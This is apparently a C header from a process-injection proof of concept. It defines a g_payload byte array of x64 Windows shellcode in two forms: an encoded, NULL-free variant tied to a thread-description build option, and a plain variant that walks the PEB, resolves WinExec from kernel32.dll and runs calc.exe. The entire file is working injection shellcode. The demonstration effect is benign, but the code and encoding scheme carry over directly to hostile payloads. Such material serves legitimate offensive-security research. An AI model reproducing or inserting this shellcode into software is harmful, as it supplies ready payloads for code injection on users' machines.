#pragma once

#ifdef _WIN64
	#ifdef USE_DEFAULT_SET_THREAD_DESC
	//encoded shellcode (no NULL bytes)
	unsigned char g_payload[] = {
		0x48, 0x31, 0xC9, 0x48, 0x81, 0xE9, 0x5D, 0xFF, 0xFF, 0xFF, 0x48, 0x8D,
		0x05, 0xEF, 0xFF, 0xFF, 0xFF, 0x48, 0xBB, 0x64, 0x8B, 0x0A, 0x55, 0x36,
		0x0B, 0x54, 0xA5, 0x48, 0x31, 0x58, 0x25, 0x48, 0x83, 0xE8, 0xF8, 0xE2,
		0xF6, 0x32, 0xC3, 0x81, 0xA1, 0x7E, 0x88, 0xB0, 0x55, 0x2C, 0x08, 0xE6,
		0x75, 0xDE, 0x0E, 0x54, 0xA5, 0x64, 0xC3, 0x81, 0xB3, 0x68, 0xC8, 0x1C,
		0x26, 0x88, 0xC3, 0xE2, 0x75, 0x36, 0x0B, 0x54, 0xCE, 0x64, 0xEE, 0x0A,
		0x27, 0x36, 0x65, 0x54, 0xC0, 0x64, 0xE7, 0x0A, 0x66, 0x36, 0x39, 0x54,
		0x8B, 0x64, 0xEF, 0x0A, 0x39, 0x36, 0x67, 0x54, 0xA5, 0x64, 0x8B, 0x0A,
		0x55, 0x36, 0x0B, 0x54, 0xFC, 0x8C, 0x2E, 0x08, 0x55, 0x36, 0x43, 0xDD,
		0xE1, 0x40, 0xAB, 0x42, 0xD6, 0x4A, 0x2F, 0x74, 0xA5, 0x11, 0x8C, 0xB2,
		0x54, 0x36, 0x0B, 0x54, 0x4E, 0x38, 0x63, 0x02, 0x55, 0x36, 0x0B, 0x03,
		0xCC, 0x0A, 0xCE, 0x72, 0x30, 0x55, 0x0B, 0x0E, 0xED, 0xEF, 0xC7, 0x2E,
		0x75, 0xDE, 0x42, 0x54, 0xA5, 0x64, 0xC3, 0x83, 0x11, 0x12, 0x23, 0x1C,
		0x26, 0x18, 0xAF, 0x22, 0x55, 0x43, 0x0C, 0xEC, 0xA6, 0x64, 0x8B, 0x0A,
		0xBE, 0x06, 0x43, 0xDF, 0xE1, 0x40, 0xA3, 0x42, 0xDC, 0x72, 0x2F, 0x64,
		0xED, 0xE7, 0xF7, 0x2E, 0x65, 0x36, 0x7E, 0x53, 0x1D, 0x60, 0x8B, 0x0A,
		0x55, 0xDD, 0x1C, 0x67, 0x77, 0x8C, 0x82, 0x0A, 0x55, 0x36, 0x68, 0x35,
		0xC9, 0x07, 0xA5, 0x6F, 0x2D, 0x53, 0x0B, 0x0D, 0x5A, 0x30, 0xAF, 0x3A,
		0x66, 0xF6, 0x43, 0xD7, 0x61, 0x2C, 0x48, 0x42, 0xDC, 0x62, 0x2F, 0x44,
		0xED, 0xED, 0xC7, 0x2E, 0x5D, 0x7E, 0x88, 0xB8, 0xDD, 0x2C, 0x00, 0x8E,
		0x71, 0xB6, 0x0B, 0x54, 0xA5, 0x2C, 0x02, 0x4E, 0x71, 0x06, 0x43, 0xDF,
		0xE1, 0x40, 0xBB, 0x05, 0xE2, 0x36, 0x36, 0x19, 0xFF, 0x64, 0x8B, 0x7E,
		0x52, 0x05, 0xCB, 0xBD, 0x5F, 0x65, 0x8B, 0x0A, 0x1D, 0xBD, 0x4F, 0x70,
		0x95, 0x2C, 0xE8, 0x4A, 0x69, 0x7E, 0x80, 0xD8, 0x81, 0xE4, 0x8B, 0x0A,
		0x55, 0x7E, 0x08, 0x9C, 0xED, 0xEF, 0x4A, 0x42, 0xDC, 0x72, 0x2F, 0x14,
		0x1D, 0x6C, 0x8B, 0x0A, 0x55, 0x7E, 0x60, 0x94, 0xA5, 0x2C, 0x00, 0x46,
		0x71, 0x76, 0x43, 0xD9, 0x21, 0x65, 0x03, 0x0A, 0x55, 0x36, 0x43, 0xDD,
		0xE1, 0x40, 0xB3, 0x42, 0xDE, 0x72, 0x2F, 0x6C, 0x26, 0x5C, 0x8B, 0x7F,
		0x52, 0x05, 0xCB, 0xBD, 0x17, 0x65, 0x8B, 0x0A, 0x1D, 0xBD, 0x4F, 0x70,
		0x9D, 0xEF, 0x8B, 0x83, 0x11, 0x12, 0x13, 0xDF, 0xE1, 0x40, 0x93, 0x42,
		0x56, 0xB2, 0x2F, 0xD4, 0xA5, 0x64, 0x8B, 0x42, 0xDC, 0x72, 0x2F, 0x44,
		0xED, 0xEF, 0xCF, 0x2E, 0x45, 0xBD, 0x4B, 0x4C, 0xED, 0xED, 0xCF, 0x2E,
		0x1D, 0x7E, 0x80, 0x10, 0x81, 0x74, 0x00, 0x4A, 0x49, 0xBF, 0x4F, 0x70,
		0x81, 0x2C, 0x00, 0x4E, 0x71, 0x26, 0x80, 0x14, 0x85, 0xED, 0xCF, 0x2E,
		0x49, 0x7E, 0x80, 0x10, 0x81, 0x74, 0x00, 0x4A, 0x71, 0xBF, 0x4F, 0x70,
		0x85, 0x2C, 0x4C, 0x4E, 0x71, 0x3E, 0x0B, 0x54, 0xA5, 0x64, 0x60, 0x07,
		0x1D, 0xBD, 0x4F, 0x70, 0xAD, 0x2C, 0x74, 0xCA, 0x1D, 0xBF, 0x4F, 0x70,
		0xAD, 0x2C, 0x00, 0x4E, 0x71, 0x7E, 0x43, 0x6D, 0xE1, 0x40, 0x83, 0x05,
		0xD6, 0x0D, 0x0A, 0x54, 0xA5, 0xEF, 0xCF, 0x2E, 0x49, 0x7E, 0x80, 0xD8,
		0x81, 0xE4, 0x8B, 0x0A, 0x55, 0x7E, 0x08, 0x9C, 0xED, 0xEF, 0x4A, 0x42,
		0xDE, 0x7A, 0x2F, 0x5C, 0xED, 0xE9, 0x8F, 0x82, 0x1D, 0xBF, 0x4F, 0x70,
		0xFD, 0xEF, 0xCF, 0x2E, 0x75, 0x7E, 0x80, 0xD8, 0x81, 0xE4, 0x8B, 0x0A,
		0x55, 0x7E, 0x08, 0x9C, 0xED, 0xEF, 0x4A, 0x42, 0xDE, 0x7A, 0x2F, 0x5C,
		0xED, 0xE9, 0x8F, 0x42, 0x1D, 0xBF, 0x4F, 0x70, 0xF5, 0xEF, 0xCF, 0x2E,
		0x71, 0x7E, 0x80, 0xD8, 0x81, 0xE4, 0x8B, 0x0A, 0x55, 0x7E, 0x08, 0x9C,
		0xED, 0xEF, 0x4A, 0x42, 0xDE, 0x7A, 0x2F, 0x04, 0xAA, 0xD3, 0x82, 0x42,
		0xD8, 0x32, 0x83, 0x1C, 0x2C, 0x20, 0xAF, 0x6A, 0x1D, 0xBD, 0x4F, 0x70,
		0xFD, 0xEF, 0x8B, 0x42, 0xDE, 0xBA, 0x2F, 0xD4, 0xA5, 0x64, 0x8B, 0x42,
		0x56, 0xFE, 0x43, 0xDF, 0x64, 0x2C, 0x02, 0x4E, 0x71, 0x1E, 0x43, 0x93,
		0xA1, 0x40, 0x8B, 0x0A, 0x55, 0x36, 0xE0, 0x5F, 0xED, 0xEF, 0x8F, 0x2E,
		0x1D, 0xC9, 0xCB, 0x1C, 0x2C, 0x60, 0xAF, 0x42, 0xDE, 0x32, 0x2F, 0x1C,
		0x2E, 0xE8, 0xAF, 0x82, 0x55, 0x36, 0x0B, 0x1C, 0xA6, 0xAC, 0xC3, 0x81,
		0x94, 0x39, 0xB5, 0x54, 0x20, 0xA4, 0xFF, 0x4F, 0x1D, 0xBD, 0x0F, 0x70,
		0xED, 0xEF, 0xC7, 0x2E, 0x7D, 0x7E, 0x08, 0x9C, 0xED, 0xEF, 0x4A, 0x05,
		0xEB, 0x36, 0x8E, 0x94, 0xD1, 0x4B, 0xC3, 0x81, 0x51, 0x12, 0x43, 0xDF,
		0x29, 0x40, 0x03, 0x0A, 0x55, 0x36, 0x43, 0x57, 0x6D, 0x2C, 0x00, 0xCB,
		0x5A, 0x88, 0x0B, 0x1C, 0x2E, 0x68, 0xAF, 0x42, 0xDE, 0x62, 0x2F, 0x7C,
		0xED, 0x67, 0x5A, 0x42, 0xDE, 0xFC, 0x04, 0xEA, 0xAC, 0x5F, 0x4A, 0x7E,
		0x57, 0xDD, 0x09, 0xBF, 0x32, 0x2C, 0x00, 0x0E, 0x71, 0x7E, 0x80, 0xD8,
		0x81, 0xEC, 0x8B, 0x0A, 0x55, 0x7E, 0x08, 0x9C, 0xED, 0xEF, 0x4A, 0x05,
		0xEB, 0x36, 0x8E, 0x94, 0xD0, 0x49, 0xC3, 0x81, 0x51, 0x12, 0x43, 0xDF,
		0xE9, 0x40, 0xA3, 0x42, 0x56, 0xFE, 0x43, 0xDF, 0x64, 0x6B, 0x35, 0x0A,
		0xD0, 0xF6, 0x7E, 0x43, 0xED, 0xEF, 0xCF, 0x2E, 0x35, 0xBD, 0x0B, 0x1C,
		0x2E, 0xE8, 0xAF, 0x8A, 0x55, 0x36, 0x0B, 0x1C, 0xA6, 0xAC, 0xC3, 0x81,
		0x94, 0xDD, 0x0C, 0xBD, 0x0D, 0x9A, 0x74, 0xF5, 0x66, 0xF6, 0x43, 0xD7,
		0x61, 0x1C, 0x48, 0x42, 0xDC, 0x7A, 0x2F, 0x5C, 0xED, 0xE7, 0x67, 0x52,
		0x30, 0x7E, 0x80, 0x50, 0x80, 0x04, 0x8B, 0x0A, 0x55, 0x7E, 0x82, 0x10,
		0x81, 0x24, 0xC3, 0x81, 0x11, 0x12, 0x4B, 0x1C, 0x2E, 0x24, 0x93, 0x42,
		0xDC, 0x72, 0x2F, 0x1C, 0xED, 0xEF, 0xCF, 0x2E, 0x1D, 0x7E, 0x88, 0x94,
		0x85, 0x2C, 0x02, 0x4E, 0x71, 0x0E, 0x43, 0xDF, 0xE1, 0x40, 0xB3, 0x42,
		0xDE, 0x36, 0x43, 0xDD, 0xE1, 0x40, 0xBB, 0xE1, 0x58, 0x7E, 0x80, 0x10,
		0x81, 0x54, 0xC3, 0x81, 0x55, 0x7E, 0x82, 0x10, 0x81, 0x54, 0xC3, 0x81,
		0x11, 0x12, 0x33, 0x1C, 0x9C, 0x20, 0xAF, 0x3A, 0x5A, 0xB2, 0xB4, 0x55,
		0xA5, 0x64, 0xC3, 0x81, 0x11, 0x12, 0x3B, 0x1C, 0x26, 0x8C, 0x9B, 0x42,
		0xDC, 0x72, 0x2F, 0x7C, 0xED, 0xE7, 0xF7, 0x2E, 0x7D, 0x36, 0x7F, 0x58,
		0xED, 0xEF, 0xCF, 0x2E, 0x7D, 0x7E, 0x88, 0x2C, 0x95, 0x64, 0xFE, 0x0F,
		0xBC, 0xAE, 0x0A, 0x54, 0xA5, 0x2C, 0x00, 0x4E, 0x71, 0x1E, 0x43, 0xDF,
		0xE5, 0x04, 0xC3, 0x83, 0x11, 0x12, 0x1B, 0x1C, 0x26, 0x18, 0xAF, 0x1A,
		0x55, 0x43, 0x09, 0xBF, 0x01, 0x2C, 0x4C, 0x0E, 0x71, 0x36, 0x0B, 0x54,
		0xA5, 0x8F, 0x80, 0x42, 0xDE, 0x32, 0x2F, 0x1C, 0x5A, 0xA4, 0xC3, 0x83,
		0x51, 0x12, 0x43, 0xDF, 0xE1, 0x40, 0xA3, 0x05, 0xE2, 0x76, 0x53, 0x1C,
		0x9C, 0x60, 0xAF, 0x05, 0xD6, 0x10, 0x0A, 0x54, 0xA5, 0x2C, 0x00, 0x4E,
		0x71, 0x56, 0x43, 0xDF, 0xA9, 0x40, 0x84, 0xBD, 0x51, 0x7E, 0x8E, 0x94,
		0xD1, 0x75, 0xC3, 0x81, 0x11, 0x12, 0x1B, 0x1C, 0x2E, 0x68, 0xAF, 0x05,
		0xE2, 0x32, 0x43, 0xD1, 0x65, 0x11, 0x8E, 0xE3, 0xAA, 0x36, 0x0B, 0x54,
		0xED, 0xEF, 0xCF, 0x2E, 0x35, 0x7E, 0x80, 0x58, 0x81, 0x6B, 0x3C, 0x0E,
		0x1D, 0xB5, 0xF3, 0x0E, 0xDA, 0x23, 0xC3, 0x81, 0x11, 0x12, 0x6B, 0x1C,
		0x2E, 0x68, 0xAF, 0x05, 0xE2, 0x32, 0x43, 0xD7, 0x5D, 0x25, 0xF7, 0x3F,
		0x1D, 0xBD, 0x4F, 0x70, 0xC5, 0x2C, 0x00, 0x06, 0x71, 0x39, 0xBC, 0x50,
		0xED, 0xE7, 0x63, 0x4B, 0xD6, 0xF6, 0x6A, 0xDD, 0xE1, 0x40, 0xAB, 0x42,
		0xDE, 0x72, 0x2F, 0x34, 0xED, 0xEF, 0x87, 0x2E, 0x5A, 0x81, 0x5F, 0x70,
		0x85, 0x02, 0x02, 0x1E, 0x1D, 0x39, 0xBC, 0x10, 0x81, 0x44, 0xED, 0x83,
		0x11, 0x12, 0x03, 0xBF, 0xB7, 0x2C, 0x00, 0x4E, 0x71, 0x56, 0x43, 0xDF,
		0xA9, 0x40, 0x84, 0xBD, 0x51, 0x7E, 0x6D, 0xDD, 0xE1, 0x40, 0x83, 0x05,
		0xE2, 0x72, 0x2F, 0x5C, 0xC3, 0xED, 0xCF, 0x2E, 0x4D, 0x7E, 0x80, 0x10,
		0x81, 0x74, 0xC3, 0x81, 0x59, 0x12, 0x04, 0xE3, 0xA1, 0x2C, 0x08, 0xF2,
		0x0F, 0x49, 0x4C, 0x1C, 0x2E, 0x20, 0xAF, 0x1A, 0x1D, 0xBD, 0x07, 0x70,
		0xAA, 0xD3, 0x8F, 0x42, 0xD6, 0xCE, 0x4A, 0x28, 0x90, 0x2C, 0x00, 0x4E,
		0x71, 0x26, 0x43, 0xDF, 0xA9, 0x40, 0x84, 0xBD, 0x51, 0x7E, 0x88, 0xBC,
		0xE4, 0xE7, 0x4B, 0x6B, 0xDC, 0x72, 0x2F, 0x70, 0xED, 0xEF, 0xCF, 0x2E,
		0x45, 0x7E, 0x80, 0x58, 0x81, 0x6B, 0x3C, 0x5E, 0x71, 0x12, 0x6D, 0xDD,
		0xB1, 0x2C, 0x84, 0xBD, 0x11, 0x12, 0x2F, 0x32, 0x2C, 0x20, 0xAF, 0x00,
		0xBE, 0x24, 0x43, 0xDF, 0xE1, 0x40, 0x9B, 0x42, 0xDE, 0x3A, 0x2F, 0x5B,
		0x12, 0x60, 0xC3, 0x6C, 0xDC, 0x72, 0x2F, 0x5E, 0xAA, 0xD3, 0xCF, 0x2E,
		0x5F, 0x50, 0x82, 0x10, 0x81, 0x78, 0x84, 0xBD, 0x11, 0x12, 0x13, 0x5B,
		0x12, 0x28, 0xAF, 0x16, 0x6E, 0xF7, 0x7F, 0x56, 0x4E, 0x61, 0x62, 0xB6,
		0xAB, 0xC9, 0xF4, 0x1C, 0x2E, 0x20, 0xAF, 0x6A, 0x1D, 0xBD, 0x07, 0x70,
		0xAA, 0xD3, 0x8F, 0x42, 0xD0, 0xF6, 0x7E, 0x48, 0xED, 0xEF, 0xCF, 0x2E,
		0x45, 0x7E, 0x80, 0x58, 0x81, 0x6B, 0x3C, 0x0E, 0x1D, 0xB3, 0xCB, 0x21,
		0xAE, 0x2C, 0x00, 0x4E, 0x71, 0x1E, 0x43, 0xDF, 0xE5, 0x54, 0x60, 0x0D,
		0xBC, 0x12, 0xF5, 0xAB, 0x5A, 0x57, 0x4B, 0x42, 0xD6, 0xF2, 0x53, 0x97,
		0xA5
	};
	#else
	// plain shellcode (with NULL bytes)
	unsigned char g_payload[] = {
		0x56, 0x48, 0x8B, 0xF4, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20,
		0xE8, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xE6, 0x5E, 0xC3, 0x48, 0x83,
		0xEC, 0x38, 0xE8, 0x20, 0x00, 0x00, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x72,
		0x00, 0x6E, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E,
		0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x59, 0xE8, 0x8F, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44,
		0x24, 0x20, 0x48, 0x83, 0x7C, 0x24, 0x20, 0x00, 0x75, 0x07, 0xB8, 0x01,
		0x00, 0x00, 0x00, 0xEB, 0x46, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x57, 0x69,
		0x6E, 0x45, 0x78, 0x65, 0x63, 0x00, 0x5A, 0x48, 0x8B, 0x4C, 0x24, 0x20,
		0xE8, 0x33, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x83,
		0x7C, 0x24, 0x28, 0x00, 0x75, 0x07, 0xB8, 0x04, 0x00, 0x00, 0x00, 0xEB,
		0x1A, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x09, 0x00, 0x00, 0x00, 0x63,
		0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x59, 0xFF, 0x54, 0x24,
		0x28, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x89, 0x54, 0x24,
		0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x8B,
		0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48,
		0x8B, 0x44, 0x24, 0x30, 0x0F, 0xB7, 0x00, 0x3D, 0x4D, 0x5A, 0x00, 0x00,
		0x74, 0x07, 0x33, 0xC0, 0xE9, 0xFA, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44,
		0x24, 0x30, 0x48, 0x63, 0x40, 0x3C, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
		0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
		0x40, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B,
		0x4C, 0x24, 0x40, 0x48, 0x8D, 0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48,
		0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x83, 0x38, 0x00,
		0x75, 0x07, 0x33, 0xC0, 0xE9, 0xB2, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44,
		0x24, 0x38, 0x8B, 0x00, 0x89, 0x44, 0x24, 0x18, 0x8B, 0x44, 0x24, 0x18,
		0x48, 0x03, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
		0x10, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44,
		0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x1C, 0x89, 0x44,
		0x24, 0x24, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x20, 0x89, 0x44,
		0x24, 0x1C, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x40, 0x24, 0x89, 0x44,
		0x24, 0x20, 0x48, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0xEB,
		0x0D, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44,
		0x24, 0x08, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x39, 0x44, 0x24, 0x08,
		0x0F, 0x83, 0x3B, 0x01, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x1C, 0x48, 0x8B,
		0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
		0x48, 0x8B, 0x4C, 0x24, 0x08, 0x48, 0x8D, 0x04, 0x88, 0x48, 0x89, 0x44,
		0x24, 0x58, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
		0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24,
		0x08, 0x48, 0x8D, 0x04, 0x48, 0x48, 0x89, 0x44, 0x24, 0x50, 0x8B, 0x44,
		0x24, 0x24, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03,
		0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x0F, 0xB7, 0x09,
		0x48, 0x8D, 0x04, 0x88, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x44,
		0x24, 0x58, 0x8B, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00,
		0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
		0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0B, 0x48, 0x8B, 0x04,
		0x24, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x8B, 0x04, 0x24,
		0x48, 0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48,
		0x8B, 0xC1, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74, 0x45, 0x48, 0x8B, 0x04,
		0x24, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
		0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x74, 0x2F, 0x48, 0x8B, 0x04, 0x24, 0x48,
		0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
		0xC1, 0x0F, 0xBE, 0x00, 0x48, 0x8B, 0x0C, 0x24, 0x48, 0x8B, 0x54, 0x24,
		0x28, 0x48, 0x03, 0xD1, 0x48, 0x8B, 0xCA, 0x0F, 0xBE, 0x09, 0x3B, 0xC1,
		0x74, 0x02, 0xEB, 0x02, 0xEB, 0x97, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B,
		0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
		0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x75, 0x2D, 0x48, 0x8B, 0x04, 0x24, 0x48,
		0x8B, 0x4C, 0x24, 0x28, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xBE,
		0x00, 0x85, 0xC0, 0x75, 0x17, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x8B, 0x00,
		0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48,
		0x8B, 0xC1, 0xEB, 0x07, 0xE9, 0xA8, 0xFE, 0xFF, 0xFF, 0x33, 0xC0, 0x48,
		0x83, 0xC4, 0x78, 0xC3, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC,
		0x58, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x89,
		0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x40, 0x18,
		0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x83,
		0xC0, 0x20, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x38,
		0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0xEB, 0x0D, 0x48, 0x8B,
		0x44, 0x24, 0x30, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48,
		0x8B, 0x44, 0x24, 0x38, 0x48, 0x39, 0x44, 0x24, 0x30, 0x0F, 0x84, 0xBF,
		0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x83, 0xE8, 0x10,
		0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x83, 0x7C, 0x24, 0x28, 0x00, 0x74,
		0x0C, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x83, 0x78, 0x30, 0x00, 0x75,
		0x05, 0xE9, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48,
		0x8B, 0x40, 0x60, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0x83, 0x7C, 0x24,
		0x10, 0x00, 0x75, 0x02, 0xEB, 0xA4, 0x48, 0xC7, 0x04, 0x24, 0x00, 0x00,
		0x00, 0x00, 0xEB, 0x0B, 0x48, 0x8B, 0x04, 0x24, 0x48, 0xFF, 0xC0, 0x48,
		0x89, 0x04, 0x24, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x0F, 0xB7, 0x40, 0x58,
		0x48, 0x39, 0x04, 0x24, 0x0F, 0x83, 0x26, 0x01, 0x00, 0x00, 0x48, 0x8B,
		0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85,
		0xC0, 0x74, 0x11, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24,
		0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0, 0x75, 0x05, 0xE9, 0xFF, 0x00, 0x00,
		0x00, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7,
		0x04, 0x48, 0x83, 0xF8, 0x5A, 0x7F, 0x47, 0x48, 0x8B, 0x44, 0x24, 0x60,
		0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xF8, 0x41, 0x7C,
		0x35, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7,
		0x04, 0x48, 0x83, 0xE8, 0x41, 0x83, 0xC0, 0x61, 0x89, 0x44, 0x24, 0x20,
		0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x54,
		0x24, 0x20, 0x66, 0x89, 0x14, 0x48, 0x0F, 0xB7, 0x44, 0x24, 0x20, 0x66,
		0x89, 0x44, 0x24, 0x08, 0xEB, 0x12, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48,
		0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x66, 0x89, 0x44, 0x24, 0x08,
		0x0F, 0xB7, 0x44, 0x24, 0x08, 0x66, 0x89, 0x44, 0x24, 0x18, 0x48, 0x8B,
		0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83,
		0xF8, 0x5A, 0x7F, 0x47, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C,
		0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83, 0xF8, 0x41, 0x7C, 0x35, 0x48, 0x8B,
		0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x83,
		0xE8, 0x41, 0x83, 0xC0, 0x61, 0x89, 0x44, 0x24, 0x24, 0x48, 0x8B, 0x44,
		0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x54, 0x24, 0x24, 0x66,
		0x89, 0x14, 0x48, 0x0F, 0xB7, 0x44, 0x24, 0x24, 0x66, 0x89, 0x44, 0x24,
		0x0A, 0xEB, 0x12, 0x48, 0x8B, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24,
		0x0F, 0xB7, 0x04, 0x48, 0x66, 0x89, 0x44, 0x24, 0x0A, 0x0F, 0xB7, 0x44,
		0x24, 0x0A, 0x66, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xB7, 0x44, 0x24, 0x18,
		0x0F, 0xB7, 0x4C, 0x24, 0x1C, 0x3B, 0xC1, 0x74, 0x02, 0xEB, 0x05, 0xE9,
		0xBC, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x0C,
		0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0, 0x75, 0x1C, 0x48, 0x8B, 0x44,
		0x24, 0x10, 0x48, 0x8B, 0x0C, 0x24, 0x0F, 0xB7, 0x04, 0x48, 0x85, 0xC0,
		0x75, 0x0B, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x40, 0x30, 0xEB,
		0x07, 0xE9, 0x24, 0xFE, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x58,
		0xC3
	};

	#endif
#else
unsigned char *g_payload = nullptr;
#error 32-bit not supported
#endif

size_t g_payload_len = sizeof(g_payload);
